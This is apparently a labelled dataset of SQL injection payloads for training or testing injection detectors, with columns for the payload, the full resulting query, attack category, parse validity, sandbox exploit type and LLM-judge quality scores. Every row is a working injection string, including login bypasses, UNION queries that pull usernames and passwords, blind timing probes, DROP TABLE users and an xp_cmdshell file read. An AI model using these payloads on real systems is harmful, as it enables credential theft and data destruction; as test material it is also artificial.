query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q01066,"' OR username='admin' AND (SELECT IF(1=1, (SELECT GROUP_CONCAT(username, ':', password) FROM users), NULL))--","SELECT * FROM users WHERE username = '' OR username='admin' AND (SELECT IF(1=1, (SELECT GROUP_CONCAT(username, ':', password) FROM users), NULL))--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Null"", ""Table"", ""Star"", ""GroupConcat"", ""Literal"", ""Or"", ""If"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01067,"--' UNION SELECT username, password FROM users WHERE id=1/*","SELECT * FROM users WHERE username = '--' UNION SELECT username, password FROM users WHERE id=1/*' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01070,"1'; DECLARE @t TABLE(id INT); INSERT INTO @t SELECT username, password FROM users WHERE username='admin'; SELECT * FROM @t--","SELECT * FROM users WHERE username = '1'; DECLARE @t TABLE(id INT); INSERT INTO @t SELECT username, password FROM users WHERE username='admin'; SELECT * FROM @t--' AND password = 'anything'",union_based,login,1,0,0.0,True,postgres,"[""Identifier"", ""EQ"", ""Command"", ""Insert"", ""Parameter"", ""Table"", ""Star"", ""Var"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01071,"1' UNION SELECT username, password FROM users--","SELECT * FROM users WHERE username = '1' UNION SELECT username, password FROM users--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01072,--' OR 1=1 AND username IN (SELECT username FROM users)--,SELECT * FROM users WHERE username = '--' OR 1=1 AND username IN (SELECT username FROM users)--' AND password = 'anything',union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01073,' OR username IN (SELECT username FROM users WHERE password != NULL) AND 1=1--,SELECT * FROM users WHERE username = '' OR username IN (SELECT username FROM users WHERE password != NULL) AND 1=1--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""NEQ"", ""Null"", ""In"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01074,"--' UNION SELECT username, password FROM users; --","SELECT * FROM products WHERE name LIKE '%--' UNION SELECT username, password FROM users; --%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01076,"'/**/UNION/**/SELECT/**/CONCAT(username,':',password)/**/FROM/**/admin/**/--","SELECT * FROM products WHERE name LIKE '%'/**/UNION/**/SELECT/**/CONCAT(username,':',password)/**/FROM/**/admin/**/--%'",union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select"", ""Concat""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01077,"'; --' OR '1'='1 UNION SELECT title, description FROM articles;","SELECT * FROM products WHERE name LIKE '%'; --' OR '1'='1 UNION SELECT title, description FROM articles;%'",union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Semicolon"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01078,"1' UNION ALL SELECT CONCAT(email, '@domain.com') FROM users--","SELECT * FROM products WHERE name LIKE '%1' UNION ALL SELECT CONCAT(email, '@domain.com') FROM users--%'",union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select"", ""Concat""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01079,"(1) UNION SELECT NULL, NULL, NULL, CONCAT(password, ' from admin') FROM admin#","SELECT * FROM products WHERE name LIKE '%(1) UNION SELECT NULL, NULL, NULL, CONCAT(password, ' from admin') FROM admin#%'",union_based,search,1,0,0.0,True,mysql,"[""Identifier"", ""Paren"", ""Union"", ""Null"", ""Table"", ""Literal"", ""From"", ""Column"", ""Select"", ""Concat""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01080,1' OR EXISTS(SELECT 1 FROM orders WHERE user_id=(SELECT id FROM users LIMIT 1))--,SELECT * FROM products WHERE name LIKE '%1' OR EXISTS(SELECT 1 FROM orders WHERE user_id=(SELECT id FROM users LIMIT 1))--%',union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Limit"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01081,"1' XOR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))<50 AND '1'='1","SELECT * FROM products WHERE name LIKE '%1' XOR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))<50 AND '1'='1%'",union_based,search,1,0,0.0,True,mysql,"[""Identifier"", ""And"", ""EQ"", ""Subquery"", ""Limit"", ""Xor"", ""Table"", ""Star"", ""Substring"", ""Literal"", ""From"", ""Ascii"", ""Where"", ""LT"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01082,"--' UNION SELECT email, phone FROM customers;","SELECT * FROM products WHERE name LIKE '%--' UNION SELECT email, phone FROM customers;%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01083,"' OR '1'='1 UNION SELECT address, city FROM locations;","SELECT * FROM products WHERE name LIKE '%' OR '1'='1 UNION SELECT address, city FROM locations;%'",union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01084,' OR EXISTS(SELECT 1 FROM admins WHERE access_level=(SELECT role FROM roles LIMIT 1))--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM admins WHERE access_level=(SELECT role FROM roles LIMIT 1))--%',union_based,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Limit"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01085,"OR '1'='1--""","SELECT * FROM users WHERE id = OR '1'='1--""",union_based,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Literal"", ""Or"", ""From"", ""Where"", ""Star"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01087,"--' UNION SELECT username, password FROM admin_login --","SELECT * FROM users WHERE id = --' UNION SELECT username, password FROM admin_login --",union_based,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01088,' OR 1<>(SELECT COUNT(*) FROM users WHERE id=(-1)) --,SELECT * FROM users WHERE id = ' OR 1<>(SELECT COUNT(*) FROM users WHERE id=(-1)) --,union_based,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""Paren"", ""EQ"", ""NEQ"", ""Count"", ""Table"", ""Star"", ""Literal"", ""Or"", ""Neg"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01089,' OR EXISTS(SELECT * FROM system_privileges WHERE username=(SELECT current_user FROM dual)) --,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM system_privileges WHERE username=(SELECT current_user FROM dual)) --,union_based,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""CurrentUser"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01090,' AND id IN (SELECT id FROM posts WHERE title LIKE '%admin%') --,SELECT * FROM users WHERE id = ' AND id IN (SELECT id FROM posts WHERE title LIKE '%admin%') --,union_based,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Like"", ""In"", ""Table"", ""Star"", ""Literal"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01092,"/*' OR */1=1 UNION ALL SELECT username, password FROM users","SELECT * FROM users WHERE id = /*' OR */1=1 UNION ALL SELECT username, password FROM users",union_based,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Table"", ""Literal"", ""From"", ""Column"", ""Select""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01095,-- AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%orders%' AND table_schema = DATABASE()) --,SELECT * FROM orders WHERE status = '-- AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%orders%' AND table_schema = DATABASE()) --' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01096,"/*') UNION ALL SELECT email, password FROM users */--","SELECT * FROM orders WHERE status = '/*') UNION ALL SELECT email, password FROM users */--' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01097,-- AND CHAR(85) || CHAR(85) || CHAR(85) || (SELECT user FROM mysql.user WHERE User = 'root')--,SELECT * FROM orders WHERE status = '-- AND CHAR(85) || CHAR(85) || CHAR(85) || (SELECT user FROM mysql.user WHERE User = 'root')--' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01098,-- OR (SELECT 1 FROM sys.host_summary WHERE host LIKE 'localhost'),SELECT * FROM orders WHERE status = '-- OR (SELECT 1 FROM sys.host_summary WHERE host LIKE 'localhost')' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01099,-- AND (SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema = DATABASE())),SELECT * FROM orders WHERE status = '-- AND (SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%users%' AND table_schema = DATABASE()))' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01101,"' UNION SELECT id, username, password FROM users--","SELECT * FROM orders WHERE status = '' UNION SELECT id, username, password FROM users--' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01102,"-- AND (SELECT COUNT(*) FROM users WHERE SUBSTRING(username,1,1) = 'a')--","SELECT * FROM orders WHERE status = '-- AND (SELECT COUNT(*) FROM users WHERE SUBSTRING(username,1,1) = 'a')--' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01104,"/*') UNION ALL SELECT username, password FROM admin*/--","SELECT * FROM orders WHERE status = '/*') UNION ALL SELECT username, password FROM admin*/--' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01106,1' OR EXISTS(SELECT * FROM admin WHERE 1=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' OR EXISTS(SELECT * FROM admin WHERE 1=1) --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01107,1'; DROP TABLE IF EXISTS backup; --,"INSERT INTO comments (user_id, body) VALUES (1, '1'; DROP TABLE IF EXISTS backup; --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Drop"", ""Table"", ""Semicolon"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01108,1' AND (SELECT LENGTH(password) FROM users WHERE user_id='admin') > 0 --,"INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT LENGTH(password) FROM users WHERE user_id='admin') > 0 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Length"", ""GT"", ""Table"", ""Star"", ""Literal"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01109,1' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 --,"INSERT INTO comments (user_id, body) VALUES (1, '1' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""GT"", ""Count"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01110,"' AND 1=1 UNION SELECT email, phone FROM customers --","INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 UNION SELECT email, phone FROM customers --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Union"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01112,"1' AND (SELECT SUM(ascii(substring(username, 1, 1))) FROM admins WHERE admin_id=1) > 0 --","INSERT INTO comments (user_id, body) VALUES (1, '1' AND (SELECT SUM(ascii(substring(username, 1, 1))) FROM admins WHERE admin_id=1) > 0 --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Subquery"", ""GT"", ""Table"", ""Star"", ""Sum"", ""Literal"", ""From"", ""Ascii"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01113,"1' OR EXISTS(SELECT * FROM backups WHERE TIMESTAMPDIFF(HOUR, created_at, NOW()) < 24) --","INSERT INTO comments (user_id, body) VALUES (1, '1' OR EXISTS(SELECT * FROM backups WHERE TIMESTAMPDIFF(HOUR, created_at, NOW()) < 24) --')",union_based,comment_insert,1,0,0.0,True,default,"[""Identifier"", ""TimestampDiff"", ""EQ"", ""Anonymous"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Where"", ""LT"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01114,1'; EXEC xp_cmdshell 'type C:\path\to\file.txt' --,"INSERT INTO comments (user_id, body) VALUES (1, '1'; EXEC xp_cmdshell 'type C:\path\to\file.txt' --')",union_based,comment_insert,1,0,0.0,True,postgres,"[""Identifier"", ""EQ"", ""Command"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01115,"[""\' AND EXISTS(SELECT 1 FROM users WHERE \'a\'=\'a\') --""","SELECT * FROM users WHERE username = '[""\' AND EXISTS(SELECT 1 FROM users WHERE \'a\'=\'a\') --""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,mysql,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01116,"\' OR 1=1--""","SELECT * FROM users WHERE username = '\' OR 1=1--""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01117,"\'; DROP TABLE users; --""","SELECT * FROM users WHERE username = '\'; DROP TABLE users; --""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Drop"", ""Table"", ""Semicolon"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01119,\' AND 0<>(SELECT COUNT(*) FROM users WHERE username LIKE \'%\') --,SELECT * FROM users WHERE username = '\' AND 0<>(SELECT COUNT(*) FROM users WHERE username LIKE \'%\') --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,mysql,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01120,--' AND CASE WHEN 1=1 THEN CHAR(80)||CHAR(65)||CHAR(68)||CHAR(69)||CHAR(69) ELSE NULL END --,SELECT * FROM users WHERE username = '--' AND CASE WHEN 1=1 THEN CHAR(80)||CHAR(65)||CHAR(68)||CHAR(69)||CHAR(69) ELSE NULL END --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01121,"""' OR 1=1#","SELECT * FROM users WHERE username = '""' OR 1=1#' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,mysql,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01123,"--' AND IF((SELECT 1 FROM users LIMIT 1)=1,'Y','N')#","SELECT * FROM users WHERE username = '--' AND IF((SELECT 1 FROM users LIMIT 1)=1,'Y','N')#' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01124,"' AND BENCHMARK(1000000,ENCODE('hello',password))#","SELECT * FROM users WHERE username = '' AND BENCHMARK(1000000,ENCODE('hello',password))#' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,mysql,"[""Identifier"", ""And"", ""EQ"", ""Anonymous"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Encode"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01125,"1' AND 1=(SELECT IIF(SUM(CASE WHEN id=1 THEN 1 ELSE 0 END)>0,1,0) FROM orders)--","SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT IIF(SUM(CASE WHEN id=1 THEN 1 ELSE 0 END)>0,1,0) FROM orders)--%'",blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""GT"", ""Table"", ""Star"", ""Sum"", ""Literal"", ""Case"", ""If"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01126,"1' UNION ALL SELECT NULL,NULL,'Blind Injection'--","SELECT * FROM products WHERE name LIKE '%1' UNION ALL SELECT NULL,NULL,'Blind Injection'--%'",blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Union"", ""Null"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01128,-1' OR '1'='1',SELECT * FROM products WHERE name LIKE '%-1' OR '1'='1'%',blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Or"", ""From"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01129,"1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100 --","SELECT * FROM products WHERE name LIKE '%1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100 --%'",blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Subquery"", ""GT"", ""Limit"", ""Table"", ""Star"", ""Literal"", ""From"", ""Ascii"", ""Where"", ""Substring"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01130,1' AND LENGTH((SELECT username FROM users ORDER BY id LIMIT 1 OFFSET 0))!=0 --,SELECT * FROM products WHERE name LIKE '%1' AND LENGTH((SELECT username FROM users ORDER BY id LIMIT 1 OFFSET 0))!=0 --%',blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Length"", ""NEQ"", ""Limit"", ""Table"", ""Ordered"", ""Order"", ""Star"", ""Literal"", ""Offset"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01131,"1' AND BENCHMARK(1000000,ENCODE('msg','password')) --","SELECT * FROM products WHERE name LIKE '%1' AND BENCHMARK(1000000,ENCODE('msg','password')) --%'",blind_boolean,search,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Anonymous"", ""Table"", ""Star"", ""Literal"", ""From"", ""Where"", ""Column"", ""Encode"", ""Select""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01134,1; IF (1=1) THEN WAITFOR DELAY '0:0:5'; END;,SELECT * FROM users WHERE id = 1; IF (1=1) THEN WAITFOR DELAY '0:0:5'; END;,blind_boolean,user_lookup,1,0,0.0,True,tsql,"[""EQ"", ""Block"", ""EndStatement"", ""Literal"", ""IfBlock""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01135,1 OR 'x'='x',SELECT * FROM users WHERE id = 1 OR 'x'='x',blind_boolean,user_lookup,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Or""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01137,' OR EXISTS(SELECT 1 FROM (SELECT 1 WHERE 1=1)) --,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT 1 FROM (SELECT 1 WHERE 1=1)) --,blind_boolean,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""EQ"", ""Table"", ""Star"", ""Literal"", ""Exists"", ""Or"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01140,"1' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101), 5) ELSE CHR(0) END) --","SELECT * FROM users WHERE id = 1' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(67)||CHR(79)||CHR(101), 5) ELSE CHR(0) END) --",blind_boolean,user_lookup,1,0,0.0,True,default,"[""Identifier"", ""And"", ""EQ"", ""Chr"", ""Anonymous"", ""Paren"", ""Dot"", ""Table"", ""Star"", ""DPipe"", ""Literal"", ""Case"", ""If"", ""From"", ""Subquery"", ""Where"", ""Column"", ""Select""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
